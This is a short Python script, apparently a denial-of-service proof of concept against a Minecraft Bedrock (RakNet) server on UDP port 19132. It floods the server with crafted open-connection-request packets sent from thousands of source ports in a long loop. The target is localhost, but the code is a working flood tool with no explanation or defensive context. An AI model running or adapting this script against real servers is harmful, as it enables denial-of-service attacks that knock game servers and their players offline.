import socket
import time

dst_ip = "127.0.0.1"
dst_port = 19132
payload = "\x05\x00\xff\xff\x00\xfd\xfd\xfd\xfd\xfe\xfe\xfe\xfe\x12\x34\x56\x78\x06" + "\x00" * 1446

first_port = 19133
port_range = 4098


counter = 0
timing = 500
for j in range(100000):
	for  i in range(port_range):
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.bind(('', first_port + i))
		sock.sendto(payload, (dst_ip, dst_port))
		
		counter += 1
		if counter % timing == 0:
			time.sleep(0.1)
	timing = 100
	time.sleep(0.05)
